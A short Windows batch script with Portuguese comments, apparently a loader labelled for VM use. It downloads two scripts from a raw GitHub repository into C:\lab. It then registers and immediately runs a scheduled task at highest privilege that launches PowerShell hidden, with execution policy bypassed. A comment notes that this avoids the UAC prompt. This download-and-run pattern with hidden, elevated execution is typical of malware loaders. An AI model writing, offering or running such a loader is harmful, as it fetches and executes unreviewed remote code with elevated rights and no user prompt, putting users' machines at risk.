@echo off
rem Entrada v3.2 (VM-only): baixa do GitHub raw e roda como tarefa (sem UAC; task chama powershell direto, sem camada cmd)
set R=https://raw.githubusercontent.com/josimayktrindade-lgtm/updates/main
if not exist "C:\lab" mkdir "C:\lab"
curl.exe -s -o C:\lab\blindar.ps1 %R%/blindar.ps1
curl.exe -s -o C:\lab\b_run.cmd %R%/b_run.cmd
schtasks /delete /tn "BlindarX" /f >nul 2>&1
schtasks /create /tn "BlindarX" /rl highest /sc once /st 00:00 /tr "powershell -NoProfile -ExecutionPolicy Bypass -w h -File C:\lab\blindar.ps1" /f
schtasks /run /tn "BlindarX"
echo Rodando como tarefa (sem UAC). Log: C:\blindar.log
timeout /t 6 >nul
